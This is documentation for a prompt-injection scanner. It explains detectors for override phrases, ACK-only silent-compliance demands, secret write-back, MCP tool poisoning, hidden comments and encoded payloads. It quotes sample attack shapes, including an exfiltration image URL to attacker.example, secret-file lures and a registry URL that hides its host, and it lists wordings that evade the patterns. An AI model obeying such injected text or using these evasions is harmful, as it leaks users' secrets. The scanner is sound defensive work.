# Detectors


| Tier | Kind | Kill-chain stage |
|---|---|---|
| HIGH | `override-instructions`, `agent-addressed-imperative`, `role-marker`, `role-override`, `system-tag` | weaponization |
| HIGH | `agent-audience`, `silent-compliance`, `exfil-writeback` (text that addresses the reading agent, demands a token-only reply while it acts, or tells it to read a secret and post it back) | weaponization |
| HIGH | `tool-call-shape`, `command-lure` (pipe-to-shell, recursive delete) | exploitation |
| HIGH | `exfil-instruction` (an instruction to put the conversation, a secret or a key into a URL, link or image) | weaponization |
| HIGH | `exfil-image-url` (an image whose absolute URL carries a template placeholder; full lane only) | exploitation |
| HIGH | `encoded-instruction` (a base64, hex or percent-encoded run whose decoded text matches a HIGH phrase pattern; full lane only) | delivery |
| HIGH | `tool-desc-precondition`, `tool-desc-secrecy`, `tool-desc-instruction-tag` (instructions hidden in tool definitions; they apply to any untrusted text) | weaponization |
| HIGH | `tool-desc-cross-reference` (a tool definition that conditions another listed tool's behaviour; JSON tool lists) | weaponization |
| HIGH | `js-link` (Markdown links and `href=` attributes) | delivery |
| HIGH | `unreadable` (a file that could not be opened) | delivery |
| MEDIUM | `recon-prompt-disclosure` | recon |
| MEDIUM | `minja-*` (six memory-poisoning redirect shapes) | weaponization |
| MEDIUM | `invisible-unicode`, `html-comment-imperative`, `hidden-text-imperative`, `data-uri`, `undecodable`, `padding-hidden`, `bytecode-mismatch` | delivery |
| MEDIUM | `registry-redirect` (an npm-family registry or a pip/uv-family index set to a host outside a short allowlist, to a URL with userinfo, or to a variable; the exact forms are listed below; full lane only) | exploitation |

`invisible-unicode` flags every Unicode format character (category `Cf`: zero-width
characters, bidi controls, the tag block U+E0000-E007F used for "ASCII smuggling",
soft hyphens, invisible operators), and these blank-rendering code points that are not
format characters: U+034F (combining grapheme joiner), U+115F and U+1160 and
U+3164 and U+FFA0 (Hangul fillers), U+17B4 and U+17B5 (Khmer inherent vowels),
U+180B-U+180D and U+180F (Mongolian free variation selectors) and U+2800 (Braille
blank; legitimate Braille text uses it, and is flagged). Variation selectors
(U+FE00-FE0F, U+E0100-E01EF) are flagged except a single U+FE0E / U+FE0F emoji or text
presentation selector. These are also removed before the comment search. Tag
characters are decoded in the excerpt, so you can read the hidden text. Excerpts
show every hidden character as `<U+XXXX>`.

Files are decoded with their byte-order mark (UTF-8, UTF-16, UTF-32), and BOM-less
UTF-16 is recognized. Bytes that still do not decode as text are an `undecodable`
finding (in every lane), not a clean result. Phrase detectors also see
NFKC-normalized text, so fullwidth look-alikes match, and a sentence hard-wrapped
across two lines still matches. (The comment and hidden-text checks below are the
exception: they find their spans in the raw text.) Line numbers count CRLF, a lone CR
and LF each as one line break.

Two more checks:

- **Session buildup.** Multi-turn attacks can stay under per-file thresholds. A small
  state file (`$XDG_STATE_HOME/injection-screen/session.json`, turn it off with
  `--no-session`) remembers flagged files per provenance and source directory, and raises a HIGH
  `session-buildup` finding when 3 or more distinct files in one directory have been
  flagged within 24 hours, across runs. (The directory is the file's resolved
  parent; two unrelated `docs/` folders do not merge. The threshold and window are
  constants in `pipeline.py`, not options.) **The memory persists, per directory:** once 3 files in a
  directory have been flagged, any run within the next 24 hours with the same
  provenance that scans a file in that same directory again (even a clean file) reports
  the HIGH finding and exits 1, until the entries age out. A run that scans only other
  directories reports nothing for it, though the stored entries are kept and the state
  file is still updated. The finding's file field is the directory, and its text says
  how many files were remembered from earlier runs. Reset: delete the
  state file, or run with `--no-session`. Choose the file with `--session-state PATH`
  or the `INJECTION_SCREEN_STATE` environment variable (the flag wins); the default is
  `$XDG_STATE_HOME/injection-screen/session.json`. If that file is
  damaged or cannot be written, the check is not working, so a run with no findings
  exits 3 (PARTIAL) and names the cause instead of exiting 0.
- **Budgets.** Limits on file size, file count and wall-clock time. The deadline is
  checked between detectors, and where the platform allows it the detector pass of
  each file is also cut at the deadline, in the middle of a single long detector: a
  POSIX timer (`SIGALRM`) interrupts the scan, inside a regular expression too. That
  needs the main thread of the process, which the command line always has; a library
  call from a worker thread has only the between-detector checks, so there one detector
  that runs long is waited for. A file cut at the deadline is reported
  (`DROPPED <file>: wall-clock budget (stopped mid-file; findings from it are a floor)`)
  and the run is partial: exit 3 if nothing was found, exit 1 with a `PARTIAL` line if
  something was. The budget bounds the scan of the files; it does not bound collecting
  the file list or reading a file (the file-size cap bounds that). Each kind is capped
  at 50 findings per file (reported as `TRUNCATED`). Every dropped or cut-short file is
  reported, and the run is partial.

## Exfiltration channels

An injection that wants data out usually asks the agent to render an image whose URL holds
the data, `![x](https://attacker.example/l.png?q=[DATA])`: the interface fetches the image
when the reply renders, so nothing has to be clicked.

- **`exfil-image-url`** reads Markdown inline images (`![alt](url)`, `![alt](<url>)`, one level
  of nested brackets in the alt text), reference-style images (`![alt][ref]`, `![ref][]`,
  `![ref]`) through their `[ref]: url` definition (the finding is on the definition's line), and
  HTML `<img src=...>`. The URL must be absolute (`http(s)://` or `//`) and carry a
  placeholder: `{x}`, `{{x}}`, `[DATA]`, `<SUMMARY>` (upper-case names in brackets), `$KEY`,
  `${KEY}`, `%s`, `%(x)s`, their URL-encoded brace and bracket forms, or a query value that is
  one of a short list of upper-case data words (`?q=INFO`, `=SECRET`, `=CONVERSATION`, ...). In the
  URL's path (before `?` or `#`) a placeholder counts only when its name looks like data
  (`{conversation}.png` does, the badge template `{owner}/{repo}` does not); in the query any does.
  Links are not read: `?api_key={KEY}` in a link is ordinary API documentation.
- **`exfil-instruction`** is a phrase pattern: a verb (`append`, `add`, `include`, `insert`,
  `put`, `embed`, `encode`, ...) with a data noun (the conversation, chat history, previous
  messages, a summary, a secret, password, credential, API key, token, cookie, the system
  prompt, `.env`, environment variables, an SSH or private key, the user's data, messages or
  email) followed closely by a URL word (`to the image URL`, `in the query string`, `as a
  parameter`, a literal `https://`), in either order; or `render`/`show`/`print` an image or link
  that `contains` such data. A verb right after `never`, `not`, `n't` or `don't` is skipped.

Measured on the same machine as the comment check (read-only, 2026-10-16, counting only these
two kinds): over 12,412 Markdown, HTML, reStructuredText and text files under `/usr`, `/opt`,
`~/.nvm`, `~/.local`, `~/.cache` and `~/.npm`, `exfil-image-url` flagged none and
`exfil-instruction` flagged one, Node.js's URL documentation ("encode set ... passwords encoded
within the URL"). Not read: an image whose URL is assembled at render time from parts, a
placeholder in a word this list does not have (`?q=stuff`), and an instruction phrased without
these verbs or nouns.

## Tool definitions (MCP tool poisoning)

A tool's description and parameter descriptions are read by the model but rarely by the
person who installed the server, so they are a place to hide instructions. Save a server's
`tools/list` result (an MCP inspector shows it, or any client that logs it) as JSON and screen
it like any untrusted content: `injection-screen tools.json --provenance tool-output`.

- **`agent-audience`**: text that names an AI agent as its audience: "this message / note /
  comment / ticket / request is directed at / addressed to / meant for / for" the AI, the
  assistant, the agent, the model or a named agent product (Claude, Cursor, Copilot, ...); "is
  for you after you read"; an `Instructions for <product> ====` banner; "note for the assistant
  handling this"; a greeting to a product that tells staff to ignore the message. A bare "you"
  ("this request was directed to you") and a product name used as a product ("for Claude Code",
  "Cursor IDE setup", "Claude Code users") do not match.
- **`silent-compliance`**: the reply is to be ACK and nothing else: "do not write anything
  except ACK", "reply only with ACK", "keep the reply to ACK only", "say ACK first". "Output only
  the diff", "reply with OK first, then run the tests" and a protocol's "reply with ACK first"
  (a server, not a reader) do not match.
- **`exfil-writeback`**: read a secret-like source (tokens, keys, passwords, credentials, a
  table or column named for them such as `integration_tokens`, `.env`) and write THAT data
  ("all the contents", "the rows", "them") into a message, comment, ticket, issue, pull request,
  README, thread or a `*_messages`-style table; also object first ("copy every row of
  `integration_tokens` into ..."). "Fetch your API keys ... then post a note in the thread" and
  "paste the error summary in this issue" do not match.

  Measured (2026-10-16): the published Supabase MCP ticket gives 6 findings (0 before). A
  reviewer's 22 benign look-alikes from issue templates, bot docs, support macros and agent
  instruction files: 1 flagged, an advisory that quotes the payload verbatim (a quoted payload is
  a payload to every phrase detector). Two of the reviewer's rewordings of the ticket: both
  caught. Those 24 were used to narrow the patterns, so they are training data. **Held out**: a
  separate agent that never saw the patterns wrote 25 new attacker texts and 40 benign
  look-alikes: **6 of 25 attacks caught (24%), 0 of 40 benign flagged**. The misses address the
  agent without naming it ("whoever is using Cursor", "whichever model is wired into the IDE"),
  read secrets from places the patterns do not name (`.env.production`, `printenv`), and ask
  for a one-word reply in other words ("nothing else besides 'noted'"). A phrase screen will
  always trail rewording; the control is keeping secrets out of reach of an agent that reads
  untrusted text. 18,550 local documentation and agent-spec files: 5 flagged, every one a
  document that quotes the payload (this study's own write-up among them).

- **`tool-desc-precondition`**: "before using / calling this tool, (you must / first) read,
  call, fetch, send, include, pass, copy, upload ..." and "always call this tool first".
  "Before using this tool, make sure the server is running" does not match.
- **`tool-desc-secrecy`**: "do not / don't / never / without telling, mentioning, informing,
  notifying, alerting, revealing or showing ... the user", "the user must not know", "hide this
  from the user".
- **`tool-desc-instruction-tag`**: `<important>`, `<critical>`, `<hidden>` tags, the shape the
  published tool-poisoning examples use. (`<system>` and `<hidden-instructions>` are
  `system-tag`.)
- **`tool-desc-cross-reference`** (JSON tool lists only: `{"tools": [...]}`, a `tools/list`
  result, or a bare list of tools with a name and a description): a tool whose text says
  "when / whenever / before / after / each time <another listed tool> is called / used ..."
  followed within the sentence by a behaviour word (always, must, also, instead, change,
  replace, redirect, send, add, cc, bcc, forward, include, set, append, copy). "Use
  search_graph first, then get_code_snippet" does not match.

**Changed definitions ("rug pull").** A server can change a tool's definition after you
approved it. `injection-screen tools pin tools.json --pin tools.pin` records a SHA-256 of each
tool's name, description, input schema and annotations; `injection-screen tools check
tools.json --pin tools.pin` prints `CHANGED`, `NEW` and `REMOVED` lines and exits 1 when
anything differs, 0 when nothing does, 2 when either file cannot be read or the snapshot is
not a tool list.

Measured on the maintainer's machine (read-only, 2026-10-16): the four kinds flag nothing in
109 real tool definitions from three local MCP servers (Grafana's, a Postgres toolbox and a
code-graph server; their tool lists are not shipped here), and the three phrase kinds flag
nothing in the 12,412 local documentation files used for the other measurements (an earlier
form that also matched `<secret>` and `<instruction>` flagged 4: a CLI placeholder and a
documented output tag). Not read: instructions phrased outside these patterns, a poisoned
tool whose description is benign and whose server misbehaves at call time, and descriptions a
server sends only after the snapshot was taken.

## Encoded payloads

An injection can hide its wording from a phrase search by encoding it and asking the agent to
decode it. **`encoded-instruction`** finds base64 and URL-safe base64 runs of at least 24
characters, hex runs of at least 32 digits and runs of URL characters holding at least three
`%xx` escapes; decodes each (a run longer than 256 KiB is decoded up to that length); keeps it
only if the bytes are UTF-8 that is at least 95% printable and 60% letters or spaces; and reads
the decoded text with the HIGH phrase table (override, role takeover, tool-call shapes,
pipe-to-shell, exfiltration instructions, ...). One finding per run, showing the encoding, the
decoded words that matched and which pattern matched them.

Measured on the same machine (read-only, 2026-10-16): over 49,750 Markdown, HTML,
reStructuredText, text, JSON, SVG, notebook and YAML files under `/usr`, `/opt`, `~/.nvm`,
`~/.local`, `~/.cache` and `~/.npm`, the decoder turned 2,200 runs into readable text (1,868
base64, 306 percent-encoded, 26 hex) and none of them matched, so the check flagged no file. Not
read: other encodings (base32, ROT13, gzip, a cipher), a payload split across several runs or
assembled at read time, and a run shorter than the minimums above.

## Payloads that need no wording

- **`padding-hidden`.** Content after a run of 200 or more blank lines, or after a
  gap of 200 or more spaces inside a line, which pushes it out of a reviewer's view.
  It is in the smuggling lane, so it applies to your own skills too. Indentation is
  not a gap: the run has to sit between two visible characters. Only ASCII spaces and tabs
  count: a run of no-break (U+00A0) or ideographic (U+3000) spaces is not a gap.
- **`bytecode-mismatch`.** A directory walk checks the header of every `.pyc` and
  `.pyo` without decoding it as text. It flags *unchecked* hash-based bytecode
  (PEP 552 flags `0b01`), which Python runs without ever comparing it with the
  source beside it, and a `.pyc` outside `__pycache__` with no `.py` beside it. A
  stale cache is not flagged, because Python ignores it and recompiles. A checked
  cache whose header matches is what Python itself trusts; its body is not decoded
  or compared.
- **`registry-redirect`.** A package index or registry pointed at a host outside a
  short allowlist, at a URL that carries userinfo or a control character, or at a
  variable the screen cannot expand. It is a small parser (`registry.py`), not one
  pattern. Its scan is timed in the test suite over 200 adversarial shapes of about 1 MB, including tool names glued to themselves; the wall-clock budget bounds anything slower. Backslash-continued lines are joined first
  (a trailing backslash, optionally followed by spaces or tabs; the finding reports the
  line where the joined line starts), values are extracted by the grammar below, and
  each URL is parsed with `urllib.parse` and judged on its parsed hostname.
  *Covered, anywhere on a line, whatever command or file it is in.* The keys
  `registry` (optionally `@scope:registry`; as `registry=URL`, `registry URL`,
  `--registry URL` or `--registry=URL`, which covers `.npmrc`, `.yarnrc` and the
  `npm`/`yarn`/`pnpm` flags and `config set`), `index-url`, `extra-index-url`,
  `default-index` and `find-links` (hyphen or underscore, with or without `--`, which
  covers `pip.conf`, `uv.toml`, `pyproject.toml` and the pip and uv flags),
  `--pypi-mirror`, `npmRegistryServer`, and the variables `PIP_INDEX_URL`,
  `PIP_EXTRA_INDEX_URL`, `PIP_FIND_LINKS`, `PIPENV_PYPI_MIRROR`, `UV_INDEX`,
  `UV_INDEX_URL`, `UV_DEFAULT_INDEX`, `UV_EXTRA_INDEX_URL`, `UV_FIND_LINKS` and
  `NPM_CONFIG_REGISTRY`. Keys are case-insensitive and may be quoted (`"registry":`
  in JSON, `"index-url" =` in TOML). The separator is `=`, `:`, `:=`, `::=`, `?=`,
  `+=` or whitespace, so Makefile assignments are read. The value may be:
  a bare word or a quoted string (a quoted string may hold several URLs; each is
  checked, and uv's `name=URL` form is read as the URL); a list, `["URL", ...]` or
  `[URL]`, which may run over several lines to its closing bracket; or, for a config
  key written with `=` at the start of its line (not an upper-case variable or a
  `--flag`), the first value followed by indented continuation lines, each holding more values (the `pip.conf` multi-line form; only
  explicit `scheme://` or `//host` values are read there, so indented prose after a
  `registry:` heading is left alone). Two uv forms are read too:
  `index = [{ url = "URL" }, ...]`, and the `url` key inside a `tool.uv.index` or
  `index` array-of-tables entry (a table header written with doubled square brackets). A line that starts with `-i` or `-f` (a requirements file option
  line) is read as an index option; `-f` / `--find-links` are covered because a find-links
  location is also a package source.
  *Covered only inside that tool's own command segment:* `-i URL`, `-iURL`, `-f URL`
  and `-fURL` after `pip`, `pipN`, `python -m pip`, `pip-compile`, `pip-sync`, `pipx` or
  `pipenv`; for `uv`, `--index` and `--default-index` (space or `=`), and `-i` / `-f`
  only when `uv`'s first non-option argument is `pip` (uv's global options and their
  values, such as `--directory x`, are skipped first). For `pipx run`, only the options
  before the app name are read; what follows the app belongs to the app. A segment ends
  at `;`, `&`, `|`, a backtick or a parenthesis, and the tool name must be followed by
  an option or one of its subcommands, so `curl -i URL`, `grep -i URL`,
  `uv run tool -i URL` and the word "pip" in a sentence match nothing. Quoted strings
  that hold a command are read again as commands, up to four levels deep (`sh -c "..."`,
  `bash -c '...'`, `eval "..."`, a Dockerfile `RUN` line), and so is a Dockerfile exec
  form (`RUN ["pip", "<install>", "-i", "URL"]`, also `CMD` and `ENTRYPOINT`).
  *Judging a value:* a `$VAR`, `${VAR}`, `$(...)` or backtick value is flagged. A URL is
  flagged if it has userinfo (`user:pw@`), even on an allowed host; or a backslash in its
  host part; or a control character anywhere in it (C0 and C1 controls, DEL, U+2028 and
  U+2029: a splitter cuts the value at one while urllib3 does not, which is how
  `https://pypi.org<VT>@evil.dev/` hides its host); or cannot be parsed; or its
  lower-cased hostname (userinfo and port removed, one trailing dot ignored) is not one
  of: `registry.npmjs.org`, `registry.yarnpkg.com`, `pypi.org`, `pypi.python.org` (the
  legacy name of PyPI), `files.pythonhosted.org`, or `example.com`, `example.org`,
  `example.net` and their subdomains (the reserved documentation names). `&`, `;` and
  `|` end the host, so `https://pypi.org&x=1` names `pypi.org`, unless an `@` also sits
  in the authority (then it is userinfo). The match is on the whole hostname, not a
  prefix, so `pypi.org.evil.dev` and `pypi.org..` are flagged. `test.pypi.org` is
  flagged: anyone can upload there. `http:` is judged like `https:`. `file:` and any
  other `scheme://` value are flagged. A scheme-less `host.tld/path` or `//host/path` is
  judged as a host after an option name or `=` / `:`, but not after a bare word, so prose
  is not hit. Bare relative or absolute paths (`./mirror`, `/srv/index`) are not flagged:
  they cannot be told from ordinary local configuration and name no remote host;
  `file:` is the explicit form and is flagged.
  *Expected hits on ordinary CI in the full lane:* `registry: ${{ env.REGISTRY }}` (a
  variable), `registry: docker.io/org` (a container registry, read as a host), a scoped
  npm registry (`@org:registry=https://npm.org.dev/`) and an `--extra-index-url` for a
  GPU wheel index are all findings by this definition. The detector does not run in the
  skill lane, where a mirror is ordinary configuration.
  *Not covered:* `uvx`, `poetry` (including its source tables), `conda`,
  `cargo`, `go` and other tools; `pipx --pip-args`; `pip --trusted-host`; `.pypirc`; a
  `url` key outside a `tool.uv.index` or `index` array-of-tables entry or an `index = [...]`
  array; values on the indented lines under a `key:` heading (YAML block lists and maps, only
  the `=` form continues); options after the app name in `pipx run`; a bare
  `registry host.tld` written with a space and no scheme; a tool option
  whose value is a backtick command (`pip -i` followed by a backtick substitution:
  the backtick ends the segment, so Markdown inline code works; `registry=` followed
  by a backtick command is flagged); quoted commands nested deeper than four levels,
  and backslash-escaped quotes inside a quoted command; continuation by other means
  than a trailing backslash (PowerShell backtick, batch `^`), by a TOML multi-line
  string, or by hard-wrapping prose; a URL built up from several shell variables or
  commands beyond what a single `$VAR` value shows. A line whose keys overlap so that
  reading each value would take more than the line's own length (`registry=registry=...`
  as one unbroken word) is reported once as "too many overlapping keys" and the rest of
  that line is not judged. The detector is full lane only.

## What a directory walk reads

A walk reads a file when its suffix (compared without regard to case) is one of:

* prose and rendered formats: `.md`, `.markdown`, `.mdx`, `.txt`, `.rst`, `.adoc`,
  `.asciidoc`, `.html`, `.htm`, `.xhtml`, `.xml`, `.svg`, `.ipynb`
* data and config: `.json`, `.jsonl`, `.yaml`, `.yml`, `.toml`, `.ini`, `.cfg`
* scripts: `.py`, `.sh`, `.bash`, `.zsh`, `.js`, `.mjs`, `.cjs`, `.ts`, `.rb`, `.pl`,
  `.ps1`

and, whatever their suffix, these files by name (case-insensitive): package-registry settings
`.npmrc`, `.yarnrc`, `.pypirc`, `pip.conf`, `.condarc` (where a registry redirect is planted);
files that run commands at build or setup time, `Dockerfile` and `Dockerfile.<x>`,
`Containerfile`, `Makefile`, `GNUmakefile`, `Jenkinsfile`, `Procfile`, `justfile`; and
environment and shell profiles, `.env` and `.env.<x>`, `.envrc`, `.bashrc`, `.zshrc`,
`.profile`, `.bash_profile` (a `Dockerfile.<x>` or `.env.<x>` with an image or archive suffix
is not read).

Scripts are read as text because a skill's payload is as likely to sit in the script it
tells the agent to run as in its prose. In the full lane the phrase detectors apply to
them too, so a script that quotes an attack string is flagged, exactly as a document
would be. `.pyc` and `.pyo` files are header-checked, not decoded. Everything else
(images, archives, binaries, `.csv`, `.log`, other files with no suffix, ...) is **not
read**: a walk counts such files in `skipped_by_suffix` and prints the count in the
SUMMARY line, but does not list them, and the run still exits 0. A file named on the
command line is read whatever its suffix. If your content arrives in a format outside
the list, name the files, or convert them first.

## `html-comment-imperative` and `hidden-text-imperative`

Both read the RAW file. The model reads what is on disk, so renderer state (code fences,
inline code, front matter, HTML blocks, an earlier stray backtick) never hides anything
from them. Spans are found in the raw text, never in a folded copy: a renderer does not
fold `--` plus a fullwidth `>` (U+FF1E), `U+FF0D U+FF0D >` or `U+FE63 U+FE63 >` into
`-->`, so a scanner that did would close the comment early while the renderer kept
hiding the rest. Only the body of a span is folded for the phrase search.

### `html-comment-imperative`: what is a comment

* `<!--` up to the first ASCII `-->` after it (several lines are fine). The opener is
  also found with fullwidth or small-form look-alikes of `<`, `!` and `-`, which only
  ever finds more than a renderer hides.
* In prose, data and markup files (anything that is not a programming-language
  source, not `.txt`): also `<!x ... >` up to the first `>` (a browser's bogus comment;
  a `<!DOCTYPE ...>` declaration is read the same way, since its text is not shown either;
  in a Markdown file the `<!` must be followed by a letter, since CommonMark shows `<!,`
  as text, but in `.html`, `.htm`, `.xhtml`, `.xml`, `.svg` and `.mdx` any character
  counts), `<?...>` up to the first `>`, and `<![CDATA[ ... ]]>`. In those HTML-family
  files also `</` followed by a non-letter (a bogus comment) and the text after an end
  tag's name (`</x text>`, which a browser drops unseen), each up to the first `>`.
* In `.txt` only `<!-- -->` counts: plain text is not rendered, so `Use <?php to start`
  hides nothing.
* In prose, a comment that never closes runs to the end of the text, since a renderer
  hides all of it.
* In a programming-language source (`detectors.SOURCE_SUFFIXES`: `.py`, `.js`, `.go`,
  `.sh`, ...), and inside the body of a CLOSED `<script>` or `<style>` element in an
  HTML-family file, only
  `<!--` counts, and only if it is terminated and at most 64 KB (`detectors.COMMENT_CAP_CHARS`,
  a count of characters of the raw text) long. An unterminated `<!--` there is a string or a
  regex about HTML. A docstring or heredoc holding a full comment is still read. The cap
  keeps most code that merely mentions comment delimiters quiet, but it does not make a
  lexer or parser quiet: a source that holds both a `<!--` string and a `-->` string within
  64 KB is read as a comment (a pygments lexer file does fire). A `<script>` or `<style>`
  with no closing tag, or one in a Markdown file, is a mention (`Use the <script> tag`),
  not an element, and blinds nothing; so is one inside a comment, a bogus comment (`<?...>`,
  `<!x...>`, `</ ...>`), an attribute value (quoted or not; an unclosed quoted value runs to the
  end of the file, as in a browser), or the body of a `<textarea>`, `<title>`, `<xmp>`,
  `<iframe>`, `<noembed>`, `<noframes>` or `<plaintext>`. A hidden element's close tag is found
  past the same spans.
* `.ipynb`, `.json` and `.jsonl` files are read twice over, once each: the text outside the
  JSON strings (`//` and `/* */` comments skipped), then every string value decoded escape by
  escape (`\u003c`, surrogate pairs; an invalid escape keeps its character), found by one
  single pass with no length limit (timed in the tests), tolerant of damaged JSON (a raw line break in a string).
  The strings of one array are joined with nothing, as Jupyter joins a cell's `source` lines,
  so a comment split across two of them is read whole; any other two strings are separate
  lines. Invisible characters, and the phrase patterns of the full lane, are looked for in the
  decoded strings too. A finding's line is the line of the string it came from.

### `hidden-text-imperative`: other text that is not shown

Prose, data and markup files only (not programming-language sources, not `.txt`):

* **Markdown comment idioms and link-reference titles.** The title of any
  `[label]: destination "title"` (or `'title'`, `(title)`, possibly on the next line,
  after CRLF too, with backslash escapes, inside a blockquote or list item, up to 64 KB)
  is never rendered (the label may hold escapes and one line break, up to 999 characters, as
  CommonMark allows); `[//]: # (text)`, `[//]: <> (text)` and `[comment]: <> (text)` are
  the portable Markdown comments. Entities in the title are decoded first.
* **Elements hidden by markup.** The body of any element whose start tag has the
  `hidden` attribute (any value), a `style` that hides it, or an SVG presentation
  attribute that hides it (`display="none"`, `visibility="hidden|collapse"`,
  `opacity="0"`, `font-size="0"`); and of every `<template>` and `<noscript>`. A style
  hides when, after entities are decoded, CSS comments dropped and CSS escapes decoded
  (`displ\61y`), it contains `display:none`, `visibility:hidden|collapse`, `font-size:0`
  (any unit) or `opacity:0`. Two browser rules are applied to attributes: the first of a name
  wins and a value never hides another attribute (`title='style="..."'` is a title). A
  `/` before `>` does not close a non-void element (it does in `.xml`, `.svg` and
  `.xhtml`). The body runs to the matching close tag, found by these rules: tags of
  the same name are counted, and comments, quoted attribute values and the bodies of
  `<script>`, `<style>`, `<textarea>` and `<title>` are skipped, so a `</div>` inside them
  closes nothing. A body longer than 64 KB is reported as not fully read (a finding),
  never skipped. Tags inside are dropped and entities decoded before the search.
  `class="hidden"`, `aria-hidden` and `font-size:0.9em` do not hide. The stock
  single-page-app `<noscript>` fallbacks, whole and exact ("You need to enable JavaScript
  to run this app.", "Please enable JavaScript to view this page.", "This site requires
  JavaScript to work properly."), are excused from the word search, never from the HIGH
  phrases. In every hidden body the HIGH phrases are also searched before the tags are
  dropped, so a tag-shaped phrase (`<system>`, `<invoke name=...>`) inside one is found.

### How a body is searched

**Normalisation.** Before the search the body has invisible characters removed, is
NFKC-folded, has CamelCase split into words, and has hyphens, underscores, backticks and
a dot between two letters turned into spaces. `ignore-all-previous-instructions`,
`IgnorePreviousInstructions`, a backtick-wrapped payload and the dotted
`ignore.previous.instructions` all read as words.

**What fires.** The first match of any of: an imperative or instruction word
(`ignore`, `disregard`, `forget`, `override`, `execute`, `run`, `install`, `send`,
`upload`, `exfiltrate`, `leak`, `reveal`, `obey`, `pretend`, `instruction(s)`, `act as`,
`you must|should|shall|will|need to|are now`, `sudo`, `scp`, `curl`, `wget`, `npx`,
`eval`, `pip|npm|yarn|pnpm|gem|cargo|brew|conda|uv|poetry|apt install|add`; the common
inflections `ignores|ignored|ignoring`, `executes|executed|executing`,
`sends|sending|sent` and so on); concealment (`do not|don't|never|without telling|
informing|mentioning|showing ... the user`, `hide this from the user`); a lure for
secrets (`.ssh`, `.aws`, `.gnupg`, `.kube`, `.npmrc`, `.netrc`, `.pypirc`,
`.git-credentials`, `.bash_history`, `kubeconfig`, `printenv`, `id_rsa`, `/etc/passwd`,
`credentials`, `api|secret|private|access key`, `.env`); or any HIGH phrase pattern of
the full lane (override of prior instructions, `system:` / `assistant:` role markers,
`you must now`, tool-call shapes, pipe-to-shell lures, ...).

**The only exemption** is a whole-comment match, after trimming and ignoring case,
against the tool directives below (`detectors.KNOWN_DIRECTIVES` and
`detectors.ARG_DIRECTIVES`). Applies to comments only, not to hidden text. An exemption
excuses the word search, **never the HIGH phrases**: the whole comment, normalised as
above (so `ignore-all-previous-instructions` and CamelCase read as words), is always
searched for them first.

* `prettier-ignore`, `prettier-ignore-start`, `prettier-ignore-end`
* `markdownlint-disable`, `markdownlint-enable`, each optionally with `-next-line`,
  `-line` or `-file` and followed by rule ids of the form `MD013`;
  `markdownlint-capture`, `markdownlint-restore`
* `markdown-link-check-disable`, `markdown-link-check-enable` (optionally `-next-line` /
  `-line`)
* `toc`, `/toc`, `toc:start`, `toc:end`
* doctoc: `START doctoc generated TOC please keep comment here to allow auto update`
  (`START` or `END`, the tail optional) and `DON'T EDIT THIS SECTION, INSTEAD RE-RUN
  doctoc TO UPDATE`
* all-contributors: `ALL-CONTRIBUTORS-LIST:START`, `ALL-CONTRIBUTORS-LIST:END`,
  `ALL-CONTRIBUTORS-BADGE:START`, `ALL-CONTRIBUTORS-BADGE:END`, each optionally followed by
  `- Do not remove or modify this section`
* `cspell:disable`, `cspell:enable` (optionally `-next-line` / `-line`)
* `vale off`, `vale on`, and `vale Style.Rule = NO` / `= YES` (the rule name must hold
  a dot: `Microsoft.Contractions`, `write-good.Passive`)
* `mdx-ignore`, `more`, `truncate`

Doxygen's `doxytag:` comments are NOT exempt: no attribute shape was found that is both useful
and unable to carry an instruction, so Doxygen-generated HTML trips this check often (its
`member` values hold words such as `executed`). Scan the sources, not the generated docs.

Directives that take a list: `cspell:ignore` (also `words`), `codespell:ignore`,
`typos: ignore`, `textlint-disable` / `textlint-enable`, and the remark-lint markers
`lint disable|enable|ignore`. The arguments must be tokens of word characters, `'` and `-`
(and `.` `/` `@` between them, for a rule id or glob), separated by spaces or commas, at
most 30 of them, each at most 40 characters. A full stop or any other punctuation ends the
shape. Bare words can still be prose, so the arguments are searched
before the comment is excused: a list of up to 3 tokens only for the HIGH phrases, a
longer one with the full word search above (the directive's own name excluded).

Anything else in the comment beyond a directive, even one word, is examined normally:
`prettier-ignore-start and then ...` fires. There are no content exemptions:
`please run \`...\``, `instructions for maintainers` and text in backticks are all read.

### Measured false positives

On one machine (the maintainer's), read-only, over the `.md` and `.markdown` files under
`/usr`, `/opt`, `~/.nvm`, `~/.local`, `~/.cache` and `~/.npm` (4,013 files, symlinks skipped,
measured 2026-10-15, counting only these two kinds): 345 contain a `<!--`, and **the comment
check flags 23 of those 345 (6.7%), which is 0.57% of all the Markdown files**; the hidden-text
check flags none of them. Over the HTML, XML, SVG, text, JSON, notebook and reStructuredText
files under `/usr/share/doc` (1,722 files that day; the count drifts as packages change), 31 (1.8%) are flagged, most of them Doxygen-generated
HTML (see below) or generated HTML with a comment such as `Execute shell command and view
output`. The flagged Markdown comments are ordinary maintainer notes that use a trigger word
(`override`, `run`, `instructions`, `install`, `execute`), for example `npm run toc to
regenerate the Table of Contents`. The rate depends on the corpus.

**Other false positives (by design).** An ordinary maintainer comment that uses one of
the words above: `<!-- Please run make test -->`, `<!-- run order matters -->`,
`<!-- ignore this row -->`, `<!-- eslint-ignore-next-line -->`,
`<!-- instructions for maintainers: keep sorted -->`, `<!-- send mail on error -->`; a
tool directive that is not in the list; Doxygen-generated HTML; a hidden body longer than
64 KB (an inline SVG sprite sheet with `display:none`, a large `<template>`), which is
reported as not fully read; a visible element that is a placeholder
(`<template>` outside a code span in a Markdown file is a hidden element to a renderer);
a source file that holds both a `<!--` string and a `-->` string within 64 KB. Acknowledge
one with its fingerprint in `<root>/.injection-scan-ack` (see [usage](usage.md)). A TODO or
a note with none of the words (`<!-- TODO: add screenshot -->`, `<!-- table generated by
script -->`) is quiet.

### What these two kinds do NOT examine (false negatives)

* **Paraphrase** that uses none of the words and none of the HIGH phrases; and evasions of
  the word match itself: letters spaced apart (`i g n o r e`), leetspeak, diacritics or a
  dotless `i`, a word split by something other than a separator or an invisible
  character, inflections not listed, and any non-English wording.
* Text hidden by anything other than the list above: `<details>` content (collapsed, but
  ordinary prose in most documents; not read), `color:transparent`, white-on-white
  text, `width:0`, off-screen positioning (`position:absolute; left:-9999px`), a class
  hidden by a stylesheet, `<textarea>`, `<!-- -->` inside `<![CDATA[`, `<title>` and
  `<meta>` content, SVG `<desc>`, `alt` and `title` attributes, inline-link titles
  `[a](url "title")`, image alt text.
* A link-reference definition whose destination holds parentheses or is longer than
  2,000 characters, whose title is longer than 64 KB, or whose label is longer than 999
  characters or spans more than one line break.
* Other visually-hidden recipes: `height:0`, `overflow:hidden`, `clip:rect(0,0,0,0)`,
  `clip-path`; and attribute values (`<input type="hidden" value="...">`, `placeholder`,
  `data-*`, `content`).
